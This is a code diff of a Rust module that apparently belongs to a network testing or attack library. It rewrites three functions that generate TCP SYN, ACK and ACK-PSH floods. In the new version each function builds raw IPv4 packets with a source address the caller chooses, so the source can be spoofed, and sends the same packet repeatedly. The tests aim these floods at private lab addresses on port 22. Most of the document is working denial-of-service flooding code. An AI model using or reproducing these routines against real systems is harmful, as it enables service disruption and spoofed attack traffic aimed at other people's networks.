@@ -1,12 +1,16 @@
 use anyhow::Result;
+use pnet::packet::ip::IpNextHeaderProtocols;
+use pnet::packet::ipv4;
+use pnet::packet::ipv4::{Ipv4Flags, MutableIpv4Packet};
 use pnet::packet::tcp::{ipv4_checksum, MutableTcpPacket, TcpFlags};
 use rand::Rng;
 use std::net::Ipv4Addr;
 
-use crate::utils::return_layer4_tcp_channel;
-use crate::utils::TCP_BUFF_SIZE;
-use crate::utils::TCP_DATA_LEN;
-use crate::utils::TCP_HEADER_LEN;
+use crate::layers::layer3_ipv4_send;
+use crate::layers::{IPV4_HEADER_SIZE, TCP_HEADER_SIZE};
+
+const TCP_DATA_SIZE: usize = 0;
+const TTL: u8 = 64;
 
 pub fn send_syn_flood_packet(
     src_ipv4: Ipv4Addr,
@@ -15,12 +19,25 @@ pub fn send_syn_flood_packet(
     dst_port: u16,
     max_same_packet: usize,
 ) -> Result<()> {
-    let (mut tcp_tx, _) = return_layer4_tcp_channel(TCP_BUFF_SIZE)?;
+    let mut rng = rand::thread_rng();
+    // ip header
+    let mut ip_buff = [0u8; IPV4_HEADER_SIZE + TCP_HEADER_SIZE + TCP_DATA_SIZE];
+    let mut ip_header = MutableIpv4Packet::new(&mut ip_buff).unwrap();
+    ip_header.set_version(4);
+    ip_header.set_header_length(5);
+    ip_header.set_source(src_ipv4);
+    ip_header.set_destination(dst_ipv4);
+    ip_header.set_total_length((IPV4_HEADER_SIZE + TCP_HEADER_SIZE + TCP_DATA_SIZE) as u16);
+    let id = rng.gen();
+    ip_header.set_identification(id);
+    ip_header.set_flags(Ipv4Flags::DontFragment);
+    ip_header.set_ttl(TTL);
+    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
+    let c = ipv4::checksum(&ip_header.to_immutable());
+    ip_header.set_checksum(c);
 
     // tcp header
-    let mut rng = rand::thread_rng();
-    let mut tcp_buff = [0u8; TCP_HEADER_LEN + TCP_DATA_LEN];
-    let mut tcp_header = MutableTcpPacket::new(&mut tcp_buff[..]).unwrap();
+    let mut tcp_header = MutableTcpPacket::new(&mut ip_buff[IPV4_HEADER_SIZE..]).unwrap();
     tcp_header.set_source(src_port);
     tcp_header.set_destination(dst_port);
     tcp_header.set_sequence(rng.gen());
@@ -34,9 +51,7 @@ pub fn send_syn_flood_packet(
     tcp_header.set_checksum(checksum);
 
     for _ in 0..max_same_packet {
-        match tcp_tx.send_to(&tcp_header, dst_ipv4.into()) {
-            _ => (),
-        }
+        let _ret = layer3_ipv4_send(src_ipv4, dst_ipv4, &ip_buff, vec![], 0)?;
     }
     Ok(())
 }
@@ -48,12 +63,25 @@ pub fn send_ack_flood_packet(
     dst_port: u16,
     max_same_packet: usize,
 ) -> Result<()> {
-    let (mut tcp_tx, _) = return_layer4_tcp_channel(TCP_BUFF_SIZE)?;
+    let mut rng = rand::thread_rng();
+    // ip header
+    let mut ip_buff = [0u8; IPV4_HEADER_SIZE + TCP_HEADER_SIZE + TCP_DATA_SIZE];
+    let mut ip_header = MutableIpv4Packet::new(&mut ip_buff).unwrap();
+    ip_header.set_version(4);
+    ip_header.set_header_length(5);
+    ip_header.set_source(src_ipv4);
+    ip_header.set_destination(dst_ipv4);
+    ip_header.set_total_length((IPV4_HEADER_SIZE + TCP_HEADER_SIZE + TCP_DATA_SIZE) as u16);
+    let id = rng.gen();
+    ip_header.set_identification(id);
+    ip_header.set_flags(Ipv4Flags::DontFragment);
+    ip_header.set_ttl(TTL);
+    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
+    let c = ipv4::checksum(&ip_header.to_immutable());
+    ip_header.set_checksum(c);
 
     // tcp header
-    let mut rng = rand::thread_rng();
-    let mut tcp_buff = [0u8; TCP_HEADER_LEN + TCP_DATA_LEN];
-    let mut tcp_header = MutableTcpPacket::new(&mut tcp_buff[..]).unwrap();
+    let mut tcp_header = MutableTcpPacket::new(&mut ip_buff[IPV4_HEADER_SIZE..]).unwrap();
     tcp_header.set_source(src_port);
     tcp_header.set_destination(dst_port);
     tcp_header.set_sequence(rng.gen());
@@ -67,9 +95,7 @@ pub fn send_ack_flood_packet(
     tcp_header.set_checksum(checksum);
 
     for _ in 0..max_same_packet {
-        match tcp_tx.send_to(&tcp_header, dst_ipv4.into()) {
-            _ => (),
-        }
+        let _ret = layer3_ipv4_send(src_ipv4, dst_ipv4, &ip_buff, vec![], 0)?;
     }
     Ok(())
 }
@@ -81,12 +107,25 @@ pub fn send_ack_psh_flood_packet(
     dst_port: u16,
     max_same_packet: usize,
 ) -> Result<()> {
-    let (mut tcp_tx, _) = return_layer4_tcp_channel(TCP_BUFF_SIZE)?;
+    let mut rng = rand::thread_rng();
+    // ip header
+    let mut ip_buff = [0u8; IPV4_HEADER_SIZE + TCP_HEADER_SIZE + TCP_DATA_SIZE];
+    let mut ip_header = MutableIpv4Packet::new(&mut ip_buff).unwrap();
+    ip_header.set_version(4);
+    ip_header.set_header_length(5);
+    ip_header.set_source(src_ipv4);
+    ip_header.set_destination(dst_ipv4);
+    ip_header.set_total_length((IPV4_HEADER_SIZE + TCP_HEADER_SIZE + TCP_DATA_SIZE) as u16);
+    let id = rng.gen();
+    ip_header.set_identification(id);
+    ip_header.set_flags(Ipv4Flags::DontFragment);
+    ip_header.set_ttl(TTL);
+    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
+    let c = ipv4::checksum(&ip_header.to_immutable());
+    ip_header.set_checksum(c);
 
     // tcp header
-    let mut rng = rand::thread_rng();
-    let mut tcp_buff = [0u8; TCP_HEADER_LEN + TCP_DATA_LEN];
-    let mut tcp_header = MutableTcpPacket::new(&mut tcp_buff[..]).unwrap();
+    let mut tcp_header = MutableTcpPacket::new(&mut ip_buff[IPV4_HEADER_SIZE..]).unwrap();
     tcp_header.set_source(src_port);
     tcp_header.set_destination(dst_port);
     tcp_header.set_sequence(rng.gen());
@@ -100,9 +139,7 @@ pub fn send_ack_psh_flood_packet(
     tcp_header.set_checksum(checksum);
 
     for _ in 0..max_same_packet {
-        match tcp_tx.send_to(&tcp_header, dst_ipv4.into()) {
-            _ => (),
-        }
+        let _ret = layer3_ipv4_send(src_ipv4, dst_ipv4, &ip_buff, vec![], 0)?;
     }
     Ok(())
 }
@@ -112,16 +149,20 @@ mod tests {
     use super::*;
     #[test]
     fn test_syn_flood_packet() {
-        let src_ipv4 = Ipv4Addr::new(192, 168, 213, 129);
-        let dst_ipv4 = Ipv4Addr::new(192, 168, 213, 128);
-        let ret = send_syn_flood_packet(src_ipv4, 8888, dst_ipv4, 80, 1).unwrap();
+        let src_ipv4 = Ipv4Addr::new(192, 168, 72, 128);
+        let dst_ipv4 = Ipv4Addr::new(192, 168, 72, 133);
+        let src_port = 34567;
+        let dst_port = 22;
+        let ret = send_syn_flood_packet(src_ipv4, src_port, dst_ipv4, dst_port, 3).unwrap();
         println!("{:?}", ret);
     }
     #[test]
     fn test_ack_flood_packet() {
-        let src_ipv4 = Ipv4Addr::new(192, 168, 213, 129);
-        let dst_ipv4 = Ipv4Addr::new(192, 168, 213, 128);
-        let ret = send_ack_flood_packet(src_ipv4, 8888, dst_ipv4, 80, 1).unwrap();
+        let src_ipv4 = Ipv4Addr::new(192, 168, 72, 128);
+        let dst_ipv4 = Ipv4Addr::new(192, 168, 72, 133);
+        let src_port = 34567;
+        let dst_port = 22;
+        let ret = send_ack_flood_packet(src_ipv4, src_port, dst_ipv4, dst_port, 3).unwrap();
         println!("{:?}", ret);
     }
 }
